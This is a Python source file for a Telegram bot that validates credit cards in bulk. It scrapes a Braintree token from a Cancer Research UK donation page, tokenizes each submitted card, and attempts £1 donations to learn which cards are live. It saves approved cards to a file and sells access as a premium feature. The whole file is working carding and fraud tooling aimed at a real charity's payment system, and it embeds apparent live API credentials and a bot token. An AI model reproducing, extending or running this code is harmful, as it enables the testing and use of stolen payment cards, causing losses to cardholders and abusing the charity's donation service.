from telethon import TelegramClient, events
import json, os, re, asyncio, datetime, random
import aiohttp
import aiofiles

# ================== CONFIG ==================
API_ID = 37235723
API_HASH = "880a876edaf529c8493b873d47821ec2"
BOT_TOKEN = "8783810252:AAEv2GtOJYG_-iBv1AMjvV8Le3kZBo9FJb0"

OWNER_ID = 7077294261

PREMIUM_FILE = "premium.json"
BANNED_FILE = "banned_users.json"
KEYS_FILE = "keys.json"
CC_FILE = "approved.txt"

# ================== FIXED B3 CHECKER ==================
async def check_b3(card: str):
    try:
        cc, mm, yy, cvv = [x.strip() for x in card.split('|')]
        if len(yy) == 2: yy = "20" + yy

        await asyncio.sleep(random.uniform(5.5, 8.5))

        ua = random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
        ])

        async with aiohttp.ClientSession() as session:
            async with session.get("https://give.cancerresearchuk.org/donate", headers={'User-Agent': ua}) as r:
                html = await r.text()

            bt_match = re.search(r'"authorizationFingerprint":"([^"]+)"', html)
            if not bt_match:
                return {"Response": "Blocked", "Status": "Declined"}

            bt_token = bt_match.group(1)

            graphql = {
                "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token } }",
                "variables": {"input": {"creditCard": {"number": cc, "expirationMonth": mm, "expirationYear": yy, "cvv": cvv}}}
            }

            async with session.post("https://payments.braintree-api.com/graphql", json=graphql, headers={
                "authorization": f"Bearer {bt_token}",
                "braintree-version": "2018-05-10",
                "content-type": "application/json"
            }) as r2:
                data = await r2.json()

            if 'tokenizeCreditCard' not in str(data):
                return {"Response": "Declined", "Status": "Declined"}

            cc_token = data['data']['tokenizeCreditCard']['token']

            payload = {'amount': '1.00', 'nonce': cc_token}

            async with session.post("https://give.cancerresearchuk.org/donate/process", data=payload, headers={'User-Agent': ua}) as r3:
                result = await r3.text()

            if "success" in result.lower() or "thank" in result.lower():
                return {"Response": "✅ B3 LIVE", "Status": "Approved"}
            else:
                return {"Response": "Declined", "Status": "Declined"}

    except Exception as e:
        return {"Response": f"Error", "Status": "Declined"}


# ================== UTILITIES ==================
async def load_json(filename):
    try:
        if not os.path.exists(filename):
            async with aiofiles.open(filename, "w") as f: await f.write(json.dumps({}))
            return {}
        async with aiofiles.open(filename, "r") as f:
            return json.loads((await f.read()).strip() or "{}")
    except: return {}

async def save_json(filename, data):
    async with aiofiles.open(filename, "w") as f:
        await f.write(json.dumps(data, indent=4))

async def is_premium_user(user_id):
    data = await load_json(PREMIUM_FILE)
    uid = str(user_id)
    if uid not in data: return False
    try:
        return datetime.datetime.now() <= datetime.datetime.fromisoformat(data[uid]['expiry'])
    except: return False

async def is_banned_user(user_id):
    data = await load_json(BANNED_FILE)
    return str(user_id) in data

async def save_approved(card, response):
    async with aiofiles.open(CC_FILE, "a", encoding="utf-8") as f:
        await f.write(f"{card} | APPROVED | {response}\n")

async def read_cards_from_txt(path):
    cards = []
    async with aiofiles.open(path, "r", encoding="utf-8", errors="ignore") as f:
        content = await f.read()
        found = re.findall(r'\d{15,16}\s*[\|:/-]\s*\d{1,2}\s*[\|:/-]\s*\d{2,4}\s*[\|:/-]\s*\d{3,4}', content)
        for c in found:
            cleaned = re.sub(r'[^0-9|]', '', c.replace(' ', ''))
            if len(cleaned.split('|')) == 4:
                cards.append(cleaned)
    return list(set(cards))

# ================== BOT WITH FIXED TXT ==================
client = TelegramClient('b3_bot', API_ID, API_HASH)

@client.on(events.NewMessage(pattern=r'(?i)^[/.](start|help)$'))
async def start(event):
    await event.reply("**🔥 B3 Checker Fixed**\nTXT + /mst Working")

# FIXED TXT HANDLER
@client.on(events.NewMessage())
async def doc_handler(event):
    if not event.document: return
    filename = event.file.name or ""
    if not filename.lower().endswith('.txt'): return
    if await is_banned_user(event.sender_id): return await event.reply("Banned!")
    if not await is_premium_user(event.sender_id) and event.sender_id != OWNER_ID:
        return await event.reply("❌ Premium only for TXT!")

    await event.reply("📂 TXT File Received. Processing...")
    path = f"temp_{event.sender_id}.txt"
    await event.download_media(path)
    cards = await read_cards_from_txt(path)
    os.remove(path)

    if not cards:
        return await event.reply("❌ No valid cards found in TXT!")

    await event.reply(f"✅ Found {len(cards)} cards. Starting check...")
    asyncio.create_task(process_mass(event, cards[:80]))

@client.on(events.NewMessage(pattern=r'(?i)^[/.]mst'))
async def mst(event):
    if await is_banned_user(event.sender_id): return await event.reply("Banned!")
    text = (await event.get_reply_message()).text if event.reply_to_msg_id else event.raw_text
    cards = re.findall(r'\d{15,16}\s*[\|:/-]\s*\d{1,2}\s*[\|:/-]\s*\d{2,4}\s*[\|:/-]\s*\d{3,4}', text)
    cards = [re.sub(r'[^0-9|]', '', c.replace(' ', '')) for c in cards]
    if not cards: return await event.reply("No cards found!")
    asyncio.create_task(process_mass(event, cards[:80]))

async def process_mass(event, cards):
    total = len(cards)
    approved = 0
    status = await event.reply(f"🔥 Checking {total} cards...")

    for i, card in enumerate(cards):
        res = await check_b3(card)
        if res["Status"] == "Approved":
            approved += 1
            await save_approved(card, res["Response"])
            await event.reply(f"💎 **B3 LIVE**\n`{card}`\n{res['Response']}")

        try:
            await status.edit(f"Progress: {i+1}/{total} | Approved: {approved}")
        except:
            pass
        await asyncio.sleep(6)

    await status.edit(f"✅ Finished!\nApproved: {approved}/{total}")

async def main():
    print("🚀 B3 Bot Started | TXT Fixed")
    await client.start(bot_token=BOT_TOKEN)
    await client.run_until_disconnected()

if __name__ == "__main__":
    asyncio.run(main())
